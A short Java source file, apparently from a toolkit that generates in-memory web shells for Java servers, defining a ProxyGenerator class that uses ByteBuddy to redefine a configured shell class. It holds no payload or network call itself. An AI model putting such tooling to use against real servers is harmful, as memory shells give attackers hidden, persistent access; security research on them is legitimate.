package com.reajason.javaweb.memshell.generator;

import com.reajason.javaweb.memshell.config.ProxyConfig;
import com.reajason.javaweb.memshell.config.ShellConfig;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;

public class ProxyGenerator extends ByteBuddyShellGenerator<ProxyConfig> {
    public ProxyGenerator(ShellConfig shellConfig, ProxyConfig shellToolConfig) {
        super(shellConfig, shellToolConfig);
    }

    @Override
    protected DynamicType.Builder<?> getBuilder() {
        return new ByteBuddy().redefine(shellToolConfig.getShellClass());
    }
}
